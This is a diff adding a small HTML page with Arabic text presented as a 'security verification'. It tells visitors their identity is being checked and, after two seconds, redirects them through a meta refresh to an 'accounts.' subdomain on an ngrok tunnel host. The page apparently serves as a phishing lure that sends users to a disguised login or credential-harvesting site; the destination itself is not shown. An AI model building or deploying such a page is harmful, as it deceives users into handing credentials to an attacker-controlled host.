@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>تحقق الأمان</title>
+    <meta http-equiv="refresh" content="2; url=https://accounts.cone-unknotted-vivacious.ngrok-free.dev" />
+</head>
+<body>
+    <div style="text-align:center; margin-top:50px;">
+        <h3>جاري التحقق من الهوية...</h3>
+        <p>يرجى الانتظار، سيتم إعادة توجيهك تلقائياً.</p>
+    </div>
+</body>
+</html>
